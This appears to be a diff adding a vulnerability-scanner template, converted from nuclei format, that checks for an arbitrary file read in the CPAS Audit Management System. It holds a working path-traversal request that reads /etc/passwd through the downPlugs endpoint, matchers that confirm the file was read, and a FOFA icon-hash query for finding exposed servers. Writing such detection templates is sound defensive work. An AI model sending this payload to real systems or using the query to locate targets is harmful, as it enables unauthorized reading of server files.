@@ -1,0 +1,120 @@
+{
+  "id": "cpas-managment-lfi",
+  "name": "CPAS Management System - Arbitrary File Read",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read. This security flaw can be exploited by attackers to access sensitive files on the server, potentially exposing critical system information. The vulnerability can be triggered by sending a specially crafted HTTP GET request to the endpoint /cpasm4/plugInManController/downPlugs with parameters fileId and fileName, enabling the retrieval of arbitrary files such as /etc/passwd. This issue poses a significant risk to system security and should be addressed immediately to prevent unauthorized access and potential data breaches.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "cpas",
+    "cms",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"-58141038\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId\u003d../../../../etc/passwd\u0026fileName",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(header, \u0027multipart/form-data\u0027, \u0027fileName\u003d\u0027)",
+            "regex(\u0027root:.*:0:0:\u0027, body)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "cpas-managment-lfi",
+    "info": {
+      "name": "CPAS Management System - Arbitrary File Read",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read. This security flaw can be exploited by attackers to access sensitive files on the server, potentially exposing critical system information. The vulnerability can be triggered by sending a specially crafted HTTP GET request to the endpoint /cpasm4/plugInManController/downPlugs with parameters fileId and fileName, enabling the retrieval of arbitrary files such as /etc/passwd. This issue poses a significant risk to system security and should be addressed immediately to prevent unauthorized access and potential data breaches.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "icon_hash\u003d\"-58141038\""
+      },
+      "tags": "cpas,cms,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId\u003d../../../../etc/passwd\u0026fileName"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(header, \u0027multipart/form-data\u0027, \u0027fileName\u003d\u0027)",
+              "regex(\u0027root:.*:0:0:\u0027, body)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
